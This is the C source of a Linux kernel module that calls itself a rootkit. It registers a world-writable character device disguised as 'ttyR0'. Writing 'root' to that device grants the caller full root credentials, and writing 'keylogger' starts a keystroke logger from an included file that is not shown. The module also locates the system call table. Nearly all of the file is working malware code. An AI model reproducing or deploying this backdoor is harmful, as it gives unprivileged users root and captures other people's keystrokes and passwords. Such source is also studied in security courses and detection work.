// lkmr.c
// Alex Cater & Andrew Parker
// 2019-12-11
// Linux Kernel Module Rootkit

#include <linux/module.h>	/* Needed by all modules */
#include <linux/kallsyms.h> /* for kallsyms_lookup_name */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#include "logger.c"

// *********************************************************************
// module metadata and get rid of taint message
// *********************************************************************

MODULE_LICENSE("GPL");

#define DRIVER_AUTHOR "Alex&Andrew"
#define DRIVER_DESC   "rootkit"

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

// *********************************************************************
// function prototypes
// *********************************************************************
static int 	__init init_main(void);
static void __exit cleanup(void);
static int setup_device(void);
static int     dev_open  (struct inode *inode, struct file *f);
//static ssize_t dev_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
//static int dev_release(struct inode *inodep, struct file *filep);

// defined in logger.c
static int run_keylogger(void);
static int exit_keylogger(void);


// *********************************************************************
// variables
// *********************************************************************
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

#define  DEVICE_NAME "ttyR0"
#define  CLASS_NAME  "ttyRK"

static unsigned long *sys_call_table;

static int majorNumber;
static struct class* rootcharClass = NULL;
static struct device* rootcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
	.open = dev_open,
	.write = dev_write,
};

// *********************************************************************
// functions definitions
// *********************************************************************

// changes permission of device to allow to rw
static int uevent(struct device *dev, struct kobj_uevent_env *env){
	add_uevent_var(env, "DEVMODE=%#o", 0666);
	return 0;
}

static int setup_device(void)
{
	// Create char device
	// major number specifies which driver handles which device file
	if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
		{
			printk(KERN_ALERT "failed to register a major number\n");
			return majorNumber;
		}
	 printk(KERN_INFO "major number %d\n", majorNumber);

	 // Register the device class
	 rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
	 if (IS_ERR(rootcharClass))
		 {
			 unregister_chrdev(majorNumber, DEVICE_NAME);
			 printk(KERN_ALERT "Failed to register device class\n");
			 return PTR_ERR(rootcharClass);
	 }

	 // change permissions of device
	 rootcharClass->dev_uevent = uevent;

	 printk(KERN_INFO "device class registered correctly\n");

	 // Register the device driver
	 rootcharDevice = device_create(rootcharClass, NULL,
					MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
	 if (IS_ERR(rootcharDevice))
		 {
			 class_destroy(rootcharClass);
			 unregister_chrdev(majorNumber, DEVICE_NAME);
			 printk(KERN_ALERT "Failed to create the device\n");
			 return PTR_ERR(rootcharDevice);
		 }

		return 0;
}

// called each time device is opened from userspace
static int dev_open (struct inode *inode, struct file *f)
{
	//printk ("Device open\n");
	//numberOpens++;
	//printk(KERN_INFO "Device has been opened %d time(s)\n", numberOpens);
	printk(KERN_INFO "----------------------------\n");
	return 0;
}

// called each time data is sent from the device to user space
/*
static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  static char  message[] = "Hello, this is a message from the kernel\n";
  int error_count = 0;

	printk ("Device read. Len: %lu\n",len);

   // copy_to_user has the format ( * to, *from, size) and returns 0 on
   error_count = copy_to_user(buf, message, sizeof(message));

   if (error_count==0){
      printk(KERN_INFO "User read %lu characters\n", len);
      return (sizeof(keys_buf));
   }
   else {
      printk(KERN_ERR "EBBChar: Failed to send %d characters to the user\n", error_count);
      return -EFAULT;
   }
  return len;
}*/

static int give_root(void)
{
  struct cred *new_cred;

  // changes old creds to root
  if ((new_cred = prepare_creds ()) == NULL)					// gets current creds
  {
    printk ("Cannot prepare credentials\n");
    return -1;
  }
  V(new_cred->uid) = V(new_cred->gid) =  0;					// changes creds. uid -> 0
  V(new_cred->euid) = V(new_cred->egid) = 0;
  V(new_cred->suid) = V(new_cred->sgid) = 0;
  V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
  commit_creds (new_cred);		// saves creds
  return 0;
}

bool compareBufs(const char *a, const char *b, const size_t len)
{
  return memcmp(a, b, len) == 0;
}

// called each time data is sent from user space to the device

// when the device is created, this function and root_open and root_read
// are passed for the device to return
// this function will wait for a user to write the cred and if the cred matches the hardcoded once
// it will change the user's id to root
static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{
	printk ("Device write. Buffer length: %lu\n", len-1);

	if (compareBufs(buf, "root", len-1))
	{
    if(!give_root())
    {
      printk("You got root!\n");
    }
	}
	else if(compareBufs(buf, "keylogger", len-1))
	{
		printk("Keylogger: activated\n");
		run_keylogger();
	}
	else if(compareBufs(buf, "exitkeylogger", len-1))
	{
		printk("Keylogger: deactivated\n");
		exit_keylogger();
	}
	else
	{	
		printk(KERN_ERR "Invalid command, nothing done\n");
	}	
	return len;
}

// *********************************************************************
//  init and exit
// *********************************************************************

// ***** module init *****
static int __init init_main(void)
{
	printk(KERN_INFO "Module loaded!\n");
  sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

  if (sys_call_table == NULL) {
    printk(KERN_ERR "Couldn't look up sys_call_table\n");
    return -1;
  }
	printk(KERN_ERR "Found sys_call_table at %p\n", sys_call_table);

  return setup_device();
}

// ***** module exit *****
static void __exit cleanup(void)
{
	// Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);
  class_destroy(rootcharClass);
  unregister_chrdev(majorNumber, DEVICE_NAME);

	printk(KERN_INFO "Goodbye.\n");
}

module_init(init_main);
module_exit(cleanup);
